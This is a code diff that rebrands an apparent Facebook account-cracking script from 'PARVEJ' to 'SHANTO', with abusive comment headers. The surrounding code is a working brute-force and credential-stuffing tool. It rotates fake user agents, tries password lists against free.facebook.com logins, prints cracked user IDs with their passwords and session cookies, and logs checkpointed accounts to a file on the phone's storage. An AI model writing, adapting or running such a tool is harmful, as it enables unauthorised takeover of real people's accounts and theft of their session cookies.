@@ -1,8 +1,8 @@
-#SC MAKED BY PARVEJ
-#Fuck PARVEJ HOSSEN
-#Dec By PARVEJ
-#PARVEJ Your Reyal Pappa
-#PARVEJ Kids Numbar 5
+#SC MAKED BY SHANTO
+#Fuck SHANTO HOSSEN
+#Dec By SHANTO
+#SHANTO Your Reyal Pappa
+#SHANTO Kids Numbar 5
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -95,23 +95,20 @@ for xd in range(10000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
 logo = ("""
-\033[1;33m d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
-\033[1;33m 88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
-\033[1;32m 88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
-\033[1;32m 88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
-\033[1;36m 88      88   88 88 `88.  `8bd8'  88.     db. 88  
-\033[1;36m 88      YP   YP 88   YD    YP    Y88888P Y8888P  
+\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
                                                  
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
 
 \033[1;92m══════════════════════════════════════════
-\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
-\033[1;32m[-] AUTHOR    :\033[1;32m PARVEJ HOSSEN
-\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
-\033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
+\033[1;32m[-] TOOLS TYPE:\033[1;32m PRIVATE
+\033[1;32m[-] AUTHOR    :\033[1;32m SHANTO 
+\033[1;32m[-] GITHUB    :\033[1;32m SHANTO
+\033[1;32m[-] FACEBOOK  :\033[1;32m SH AN TO
 \033[1;92m══════════════════════════════════════════
 
-\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SHANTO BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
 
 
 class Main:
@@ -241,7 +238,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mPARVEJ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mSHANTO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
@@ -285,21 +282,21 @@ def rcrack1(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print('\r\r\033[1;32m[SHANTO-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
+                    print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
                     print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print('\r\r\33[1;30m[SHANTO-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
-                open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
+                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[SHANTO-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
